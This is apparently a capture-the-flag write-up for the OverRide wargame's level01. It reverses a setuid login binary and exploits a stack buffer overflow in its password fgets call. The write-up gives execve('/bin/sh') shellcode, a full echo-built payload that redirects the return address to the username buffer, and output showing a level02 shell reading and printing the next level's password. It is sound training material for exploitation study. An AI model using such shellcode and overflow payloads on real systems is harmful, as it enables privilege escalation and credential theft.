
```bash
level01@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
level01@OverRide:~$ file level01 
level01: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x923fd646950abba3d31df70cad30a6a5ab5760e8, not stripped
```

Reversed in c:

```c
char a_user_name[64] = {};

bool verify_user_name(void)
{
    puts("verifying username....\n");
    return (memcmp(a_user_name, "dat_wil", 7) != 0);
}

bool verify_user_pass(const char *pass)
{
    return (memcmp(pass, "admin", 5) != 0);
}

int main(void)
{
    char pass[64];
    bool check;

    memset(pass, 0, sizeof(s));
    check = false;
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(a_user_name, 256, stdin);
    check = verify_user_name();
    if (check == true)
    {
        puts("nope, incorrect username...\n");
    }
    else                                        # to get here input must be "dat_wil + ?"
    {
        puts("Enter Password: ");
        fgets(pass, 100, stdin);
        check = verify_user_pass(pass);
        puts("nope, incorrect password...\n");
    }
    return 1;
}
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   ebp
   0x080484d1 <+1>:	mov    ebp,esp
   0x080484d3 <+3>:	push   edi
   0x080484d4 <+4>:	push   ebx
   0x080484d5 <+5>:	and    esp,0xfffffff0
   0x080484d8 <+8>:	sub    esp,0x60
   0x080484db <+11>:	lea    ebx,[esp+0x1c]
   0x080484df <+15>:	mov    eax,0x0
   0x080484e4 <+20>:	mov    edx,0x10
   0x080484e9 <+25>:	mov    edi,ebx
   0x080484eb <+27>:	mov    ecx,edx
   0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
   0x080484ef <+31>:	mov    DWORD PTR [esp+0x5c],0x0
   0x080484f7 <+39>:	mov    DWORD PTR [esp],0x80486b8
   0x080484fe <+46>:	call   0x8048380 <puts@plt>
   0x08048503 <+51>:	mov    eax,0x80486df
   0x08048508 <+56>:	mov    DWORD PTR [esp],eax
   0x0804850b <+59>:	call   0x8048360 <printf@plt>
   0x08048510 <+64>:	mov    eax,ds:0x804a020
   0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
   0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
   0x08048532 <+98>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048536 <+102>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804853b <+107>:	je     0x8048550 <main+128>
   0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0
   0x08048544 <+116>:	call   0x8048380 <puts@plt>
   0x08048549 <+121>:	mov    eax,0x1
   0x0804854e <+126>:	jmp    0x80485af <main+223>
   0x08048550 <+128>:	mov    DWORD PTR [esp],0x804870d
   0x08048557 <+135>:	call   0x8048380 <puts@plt>
   0x0804855c <+140>:	mov    eax,ds:0x804a020
   0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
   0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804856d <+157>:	lea    eax,[esp+0x1c]
   0x08048571 <+161>:	mov    DWORD PTR [esp],eax
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    eax,[esp+0x1c]
   0x0804857d <+173>:	mov    DWORD PTR [esp],eax
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048589 <+185>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804858e <+190>:	je     0x8048597 <main+199>
   0x08048590 <+192>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x08048595 <+197>:	je     0x80485aa <main+218>
   0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
   0x0804859e <+206>:	call   0x8048380 <puts@plt>
   0x080485a3 <+211>:	mov    eax,0x1
   0x080485a8 <+216>:	jmp    0x80485af <main+223>
   0x080485aa <+218>:	mov    eax,0x0
   0x080485af <+223>:	lea    esp,[ebp-0x8]
---Type <return> to continue, or q <return> to quit---
   0x080485b2 <+226>:	pop    ebx
   0x080485b3 <+227>:	pop    edi
   0x080485b4 <+228>:	pop    ebp
   0x080485b5 <+229>:	ret    
End of assembler dump.
```

We can see that the username must be "dat_wil" to pass the first check. 
The second check is on the password, we can overflow the `pass` buffer since `fgets` reads up to 100 bytes into a 64-byte buffer. 
This allows us to overwrite the return address and execute arbitrary code.

We know that the user name buffer is at `0x804a040` (DWORD PTR [esp],0x804a040 before the call to fgets), 
and we find the address of `pass` on the stack with our pattern `0x41414141 0x42424242 ...`:
```
Breakpoint 4, 0x08048579 in main ()
(gdb) x/50x $esp
0xffffd6a0:	0xffffd6bc	0x00000064	0xf7fcfac0	0x00000001
0xffffd6b0:	0xffffd8cc	0x0000002f	0xffffd70c	0x41414141
0xffffd6c0:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd6d0:	0x46464646	0x47474747	0x48484848	0x0000000a
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0x00000000
...
```

Then we find the main return address and the offset to `pass`:
```
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048579 in main; saved eip 0xf7e45513
 ...
 ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c

(gdb) p 0xffffd708 + 4 - 0xffffd6bc
$3 = 80
```

We can write our shellcode in user name buffer, and overwrite the main return address to point to our shellcode:
'\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'

We prepare our payload (can be assited by our python script `python level01/Ressources/exploit.py`):
```bash
rm -f /tmp/level01_payload
echo -ne 'dat_wil1\xc01\xd2Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG\xa0\x04\x08\n' > /tmp/level01_payload
```

```bash
level01@OverRide:~$ cat /tmp/level01_payload - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```